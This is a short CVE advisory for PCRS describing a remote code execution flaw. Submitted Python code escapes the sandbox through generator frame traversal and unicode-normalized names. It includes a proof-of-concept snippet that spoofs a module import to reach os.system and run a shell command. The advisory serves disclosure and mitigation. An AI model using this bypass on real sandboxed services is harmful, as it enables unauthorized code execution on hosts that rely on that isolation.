# CVE-2023-46404

## Summary
PCRS “Questions” page with code submission and “Code editor” page are vulnerable to remote code execution (RCE) by escaping Python sandboxing.

## Details
Remote code execution can be achieved in PCRS instances through the use of generator objects. By using generator frames (gi_frame) and f_back, scripts can traverse out of a sandboxed stack frame and execute malicious code in an unsandboxed environment. Additionally, unicode normalization can easily bypass basic input sanitization. See PoC.

## Known Affected Versions
 PCRS <= 3.11 d0de1e with Python execution.

## Mitigation
Crafting secure isolation mechanisms from scratch is prone to oversights and vulnerabilities. As always, it is better to sandbox an execution environment than a language.

### Extra
Overriding `__eq__` can be used in a restricted environment:

```python
def f():
    mod_name = "os"
    fake_name = "json"
    os = __import__(type("s", (str,), {"__eq__": lambda x, y: y == fake_name or y == mod_name, "__hash__": lambda x: hash(mod_name)})(mod_name))
    os.system("id > /tmp/test.txt")
    s = ᵒpen("/tmp/test.txt").read() # unicode normalization of the "open" function
    os.system("rm /tmp/test.txt")
    return s
```
